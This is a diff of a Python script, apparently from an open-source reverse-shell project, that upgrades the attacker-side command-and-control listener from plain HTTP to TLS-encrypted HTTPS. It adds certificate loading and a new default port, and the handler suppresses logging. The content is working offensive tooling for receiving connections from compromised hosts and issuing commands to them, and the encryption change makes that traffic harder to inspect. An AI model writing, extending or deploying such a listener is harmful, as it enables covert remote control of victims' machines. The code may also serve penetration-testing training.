@@ -1,10 +1,12 @@
 #!/usr/bin/env python3
-# https://github.com/EONRaider/BCA-Basic-HTTP-Reverse-Shell
+# https://github.com/EONRaider/BCA-Basic-HTTPS-Reverse-Shell
 
 __author__ = "EONRaider @ keybase.io/eonraider"
 
 import json
+import ssl
 from http.server import BaseHTTPRequestHandler, HTTPServer
+from pathlib import Path
 from urllib.parse import parse_qs
 
 
@@ -38,7 +40,7 @@ class ShellHandler(BaseHTTPRequestHandler):
         self._set_headers()
 
     def log_message(self, *args, **kwargs):
-        """Suppress sending of log messages to STDOUT."""
+        """Suppress display of log messages on STDOUT."""
         pass
 
 
@@ -46,21 +48,39 @@ if __name__ == '__main__':
     import argparse
 
     parser = argparse.ArgumentParser(
-        description="Basic HTTP Reverse Shell Server")
-    parser.add_argument("host",
+        description="Basic HTTPS Reverse Shell Server")
+    parser.add_argument("--host",
                         type=str,
+                        default="localhost",
+                        metavar="<hostname>",
                         help="Server address or hostname.")
     parser.add_argument("-p", "--port",
                         type=int,
-                        default=8080,
+                        default=4443,
+                        metavar="<port>",
                         help="Port number to bind the server to.")
+    parser.add_argument("--certfile",
+                        type=str,
+                        default=None,
+                        metavar="<path>",
+                        help="Absolute path to a file containing the "
+                             "server's certificate.")
     _args = parser.parse_args()
+
+    if _args.certfile is None:
+        '''Use the 'server.pem' certificate file created by default by the 
+        'generate_certificates.sh' shell script'''
+        _args.certfile = str(Path(__file__).parents[1].joinpath("server.pem"))
 
     server_sock = _args.host, _args.port
 
-    with HTTPServer(server_sock, ShellHandler) as http_server:
+    with HTTPServer(server_sock, ShellHandler) as httpd:
         try:
-            print('[>>>] Server started on http://{}:{}'.format(*server_sock))
-            http_server.serve_forever()
+            print('[>>>] Server started on https://{}:{}'.format(*server_sock))
+            httpd.socket = ssl.wrap_socket(sock=httpd.socket,
+                                           server_side=True,
+                                           certfile=_args.certfile,
+                                           ssl_version=ssl.PROTOCOL_TLS)
+            httpd.serve_forever()
         except KeyboardInterrupt:
             print('\n[!] Shutting down the server...')
